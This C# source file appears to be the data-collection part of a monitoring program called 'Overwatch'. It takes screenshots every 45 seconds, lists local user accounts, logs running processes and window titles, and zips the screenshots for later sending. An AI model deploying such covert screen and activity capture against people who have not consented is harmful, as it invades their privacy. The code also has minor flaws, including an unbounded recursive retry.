﻿using System;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO.Compression;
using System.IO;

namespace Overwatch
{
    class cReceiveInformation
    {
        public Graphics graph = null;
        public Bitmap bmp= new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        static appLog Log = new appLog();
        public int CountImage = 0;
        private static string subPath = "\\ImagesPath";
        public static string UsersName;

        public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
        public static List<string> GetComputerUsers()
        {
            List<string> users = new List<string>();
            try
            {
                var path = string.Format("WinNT://{0},computer", Environment.MachineName);
                using (var computerEntry = new DirectoryEntry(path))
                    foreach (DirectoryEntry childEntry in computerEntry.Children)
                        if (childEntry.SchemaClassName == "User")
                            users.Add(childEntry.Name);
                return users;
            }
            catch (Exception ex) { Log.Write(ex.Message, true); return users; }
        }

        public void ScreenShoot()
        {
            try
            {
                while (true)
                {
                    if (cThread.sending)
                        break;
                    if (!Directory.Exists(appConfing.targetDirPath + subPath))
                        Directory.CreateDirectory(appConfing.targetDirPath + subPath);
                    graph = Graphics.FromImage(bmp);
                    graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    bmp.Save(appConfing.targetDirPath+subPath + String.Format("\\Image{0}.bmp", CountImage.ToString()));
                    CountImage++;
                    System.Threading.Thread.Sleep(45000);
                }
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
        public static void CompressionFile()
        {
            try
            {
                string zipPath = "\\result.zip";
                ZipFile.CreateFromDirectory(appConfing.targetDirPath + subPath, appConfing.targetDirPath + zipPath);
            }
            catch (Exception ex)
            {
                DeleteFile(appConfing.targetDirPath + "\\result.zip");
                CompressionFile();
            }
        }

        public static void DeleteFile(string n) {
            File.Delete(n);
        }
        private static List<string> GeneralProcess()
        {
            Process[] procList = Process.GetProcesses();
            List<string> processUse = new List<string>();
            string ProcessName = "";
            foreach (Process a in procList){processUse.Add(a.ProcessName);}
            foreach (string a in processUse) { ProcessName += a.ToString() + " "; }
            CreateAndUpdateDate(ProcessName, appConfing.targetDirPath + "\\GeneralApplication.txt");
            return processUse;
        }
        private static void LocalProcess()
        {
            var Users = GetComputerUsers();
            UsersName = "";
            foreach (var a in Users) { UsersName += a.ToString() + "|"; UsersName.Replace(" ", ","); }
            UsersName += "Administrator";
            string name = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
            Process.GetProcesses().Where(p => new Regex(UsersName).IsMatch(p.MainWindowTitle)).ToList().ForEach(p => CreateAndUpdateDate(p.ProcessName + " ", appConfing.targetDirPath + "\\GeneralApplication.txt"));
        }
        
        public void Overview() {
            while (true)
            {
                if (cThread.sending)
                    break;
                GeneralProcess();
                LocalProcess();
                System.Threading.Thread.Sleep(60000);
            }
        }
    }
}
